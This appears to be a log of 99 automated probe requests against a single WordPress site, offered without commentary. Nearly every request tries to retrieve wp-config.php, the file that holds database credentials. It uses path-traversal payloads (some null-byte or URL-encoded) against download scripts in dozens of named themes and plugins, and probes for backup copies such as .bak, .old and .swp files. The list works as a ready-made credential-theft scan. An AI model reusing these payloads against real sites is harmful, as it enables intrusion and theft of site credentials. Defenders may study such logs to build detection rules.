Attempts: 1 - Request URL: www.lavatransforms.org/wp-content/themes/epic/includes/download.php?file=wp-config.php
Attempts: 2 - Request URL: www.lavatransforms.org/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php
Attempts: 3 - Request URL: www.lavatransforms.org/wp-content/themes/yakimabait/download.php?file=./wp-config.php
Attempts: 4 - Request URL: www.lavatransforms.org/wp-content/themes/pindol/revslider/temp/update_extract/revslider/myluph.php
Attempts: 5 - Request URL: www.lavatransforms.org/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php
Attempts: 6 - Request URL: www.lavatransforms.org/wp-content/plugins/contus-video-gallery/hdflvplayer/download.php?f=../../../../wp-config.php
Attempts: 7 - Request URL: www.lavatransforms.org/wp-content/themes/felis/download.php?file=../wp-config.php
Attempts: 8 - Request URL: www.lavatransforms.org/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php
Attempts: 9 - Request URL: www.lavatransforms.org/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php
Attempts: 10 - Request URL: www.lavatransforms.org/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php
Attempts: 11 - Request URL: www.lavatransforms.org/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php
Attempts: 12 - Request URL: www.lavatransforms.org/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php
Attempts: 13 - Request URL: www.lavatransforms.org/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php
Attempts: 14 - Request URL: www.lavatransforms.org/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php
Attempts: 14 - Request URL: www.lavatransforms.org/wp-content/themes/lote27/download.php?download=../../../wp-config.php
Attempts: 15 - Request URL: www.lavatransforms.org/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php
Attempts: 16 - Request URL: www.lavatransforms.org/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php
Attempts: 17 - Request URL: www.lavatransforms.org/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php
Attempts: 18 - Request URL: www.lavatransforms.org/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php
Attempts: 19 - Request URL: www.lavatransforms.org/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php
Attempts: 20 - Request URL: www.lavatransforms.org/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php
Attempts: 21 - Request URL: www.lavatransforms.org/wp-content/themes/epic/includes/download.php?file=../../../../wp-config.php
Attempts: 22 - Request URL: www.lavatransforms.org/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
Attempts: 23 - Request URL: www.lavatransforms.org/wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../../wp-config.php
Attempts: 24 - Request URL: www.lavatransforms.org/wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=../../../wp-config.php
Attempts: 25 - Request URL: www.lavatransforms.org/wp-content/plugins/plugin-newsletter/preview.php?data=../../../../wp-config.php
Attempts: 26 - Request URL: www.lavatransforms.org/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php
Attempts: 27 - Request URL: www.lavatransforms.org/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10
Attempts: 28 - Request URL: www.lavatransforms.org/wp-content/themes/ypo-theme/download.php?download=../../../wp-config.php
Attempts: 29 - Request URL: www.lavatransforms.org/wp-content/themes/Newspapertimes_1/download.php?filename=../../../wp-config.php
Attempts: 30 - Request URL: www.lavatransforms.org/wp-content/themes/persuasion/lib/scripts/dl-skin.php
Attempts: 31 - Request URL: www.lavatransforms.org/wp-content/themes/fusion/lib/scripts/dl-skin.php
Attempts: 32 - Request URL: www.lavatransforms.org/wp-content/themes/jarida/download.php?uri=../../../wp-config.php
Attempts: 33 - Request URL: www.lavatransforms.org/wp-content/themes/FR0_theme/down.php?path=../../../wp-config.php
Attempts: 34 - Request URL: www.lavatransforms.org/wp-content/themes/dejavu/lib/scripts/dl-skin.php
Attempts: 35 - Request URL: www.lavatransforms.org/wp-content/themes/awake/lib/scripts/dl-skin.php
Attempts: 36 - Request URL: www.lavatransforms.org/wp-content/themes/construct/lib/scripts/dl-skin.php
Attempts: 37 - Request URL: www.lavatransforms.org/wp-config.php.txt
Attempts: 38 - Request URL: www.lavatransforms.org/wp-content/themes/tess/download.php?file=../../../wp-config.php
Attempts: 39 - Request URL: www.lavatransforms.org/wp-content/themes/yakimabait/download.php?file=../../../wp-config.php
Attempts: 40 - Request URL: www.lavatransforms.org/wp-content/themes/method/lib/scripts/dl-skin.php
Attempts: 41 - Request URL: www.lavatransforms.org/wp-content/themes/markant/download.php?file=../../../wp-config.php
Attempts: 42 - Request URL: www.lavatransforms.org/wp-content/themes/felis/download.php?file=../../../wp-config.php
Attempts: 43 - Request URL: www.lavatransforms.org/wp-content/themes/corporate_works/downloader.php?file_download=../../../wp-config.php
Attempts: 44 - Request URL: www.lavatransforms.org/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php
Attempts: 45 - Request URL: www.lavatransforms.org/wp-content/themes/acento/includes/view-pdf.php?download=1&file=../../../../wp-config.php
Attempts: 46 - Request URL: www.lavatransforms.org/wp-config.php~
Attempts: 47 - Request URL: www.lavatransforms.org/wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php
Attempts: 48 - Request URL: www.lavatransforms.org/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php
Attempts: 49 - Request URL: www.lavatransforms.org/wp-content/plugins/revslider/js/admin.js
Attempts: 50 - Request URL: www.lavatransforms.org/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php
Attempts: 51 - Request URL: www.lavatransforms.org/wp-content/plugins/image-export/download.php?file=../../../wp-config.php
Attempts: 52 - Request URL: www.lavatransforms.org/wp-config.txt
Attempts: 53 - Request URL: www.lavatransforms.org/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
Attempts: 54 - Request URL: www.lavatransforms.org/wp-config.phpOLD
Attempts: 55 - Request URL: www.lavatransforms.org/wp-config.phpa
Attempts: 56 - Request URL: www.lavatransforms.org/wp-config.old
Attempts: 57 - Request URL: www.lavatransforms.org/wp-config.bak
Attempts: 58 - Request URL: www.lavatransforms.org/wp-config-backup1.txt
Attempts: 59 - Request URL: www.lavatransforms.org/wp-config%20fix.txt
Attempts: 60 - Request URL: www.lavatransforms.org/wp-content/themes/infocus/lib/scripts/dl-skin.php
Attempts: 61 - Request URL: www.lavatransforms.org/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php
Attempts: 62 - Request URL: www.lavatransforms.org/wp-content/themes/infocus2/lib/scripts/dl-skin.php
Attempts: 63 - Request URL: www.lavatransforms.org/wp-content/themes/estrutura-basica/scripts/download.php?arquivo=../../wp-config.php
Attempts: 64 - Request URL: www.lavatransforms.org/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url../../../../wp-config.php
Attempts: 65 - Request URL: www.lavatransforms.org/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../wp-config.php
Attempts: 66 - Request URL: www.lavatransforms.org/wp-content/plugins/wp-swimteam/include/user/download.php?file=../../wp-config.php&filename=../../wp-config.php&contenttype=text/html&transient=1
Attempts: 67 - Request URL: www.lavatransforms.org/wp-content/plugins/wp-swimteam/include/user/download.php?file=../../../../../wp-config.php
Attempts: 68 - Request URL: www.lavatransforms.org/wp-content/plugins/wp-mobile-detector/admin/css/style.css
Attempts: 69 - Request URL: www.lavatransforms.org/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=../../../wp-config.php
Attempts: 70 - Request URL: www.lavatransforms.org/wp-content/plugins/wp-filemanager/incl/libfile.php?path=../../&filename=wp-config.php&action=download
Attempts: 71 - Request URL: www.lavatransforms.org/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php
Attempts: 72 - Request URL: www.lavatransforms.org/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../../../../../../wp-config.php
Attempts: 73 - Request URL: www.lavatransforms.org/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../../../../../wp-config.php%00
Attempts: 74 - Request URL: www.lavatransforms.org/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php
Attempts: 75 - Request URL: www.lavatransforms.org/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../../wp-config.php
Attempts: 76 - Request URL: www.lavatransforms.org/wp-content/plugins/sell-downloads/sell-downloads.php?file=../../../wp-config.php
Attempts: 77 - Request URL: www.lavatransforms.org/wp-content/plugins/sell-downloads/sell-downloads.php?file=../../../../../../../../.././wp-config.php%00
Attempts: 78 - Request URL: www.lavatransforms.org/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php
Attempts: 79 - Request URL: www.lavatransforms.org/wp-content/plugins/rb-agency/ext/forcedownload.php?file=../../../wp-config.php
Attempts: 80 - Request URL: www.lavatransforms.org/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php
Attempts: 81 - Request URL: www.lavatransforms.org/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=../../../../wp-config.php
Attempts: 82 - Request URL: www.lavatransforms.org/wp-content/plugins/document_manager/views/file_download.php?fname=../../wp-config.php
Attempts: 83 - Request URL: www.lavatransforms.org/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=../../../wp-config.php
Attempts: 84 - Request URL: www.lavatransforms.org/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php
Attempts: 85 - Request URL: www.lavatransforms.org/wp-content/plugins/cherry-plugin/admin/import-export/upload.php
Attempts: 86 - Request URL: www.lavatransforms.org/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../../../../wp-config.php
Attempts: 87 - Request URL: www.lavatransforms.org/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../../../../../../../wp-config.php%00
Attempts: 88 - Request URL: www.lavatransforms.org/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php
Attempts: 89 - Request URL: www.lavatransforms.org/wp-content/plugins/abtest/abtest_admin.php?action=../../../wp-config.php
Attempts: 90 - Request URL: www.lavatransforms.org/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php
Attempts: 91 - Request URL: www.lavatransforms.org/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../wp-config.php
Attempts: 92 - Request URL: www.lavatransforms.org/wp-content/plugins/cherry-plugin/admin/js/widget-rules.js
Attempts: 93 - Request URL: www.lavatransforms.org/wp-config.php.swp
Attempts: 94 - Request URL: www.lavatransforms.org/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php
Attempts: 95 - Request URL: www.lavatransforms.org/wp-config.php.swo
Attempts: 96 - Request URL: www.lavatransforms.org/.wp-config.php.swp
Attempts: 97 - Request URL: www.lavatransforms.org/wp-config.php.old
Attempts: 98 - Request URL: www.lavatransforms.org/wp-config.backup
Attempts: 99 - Request URL: www.lavatransforms.org/wp-config-backup
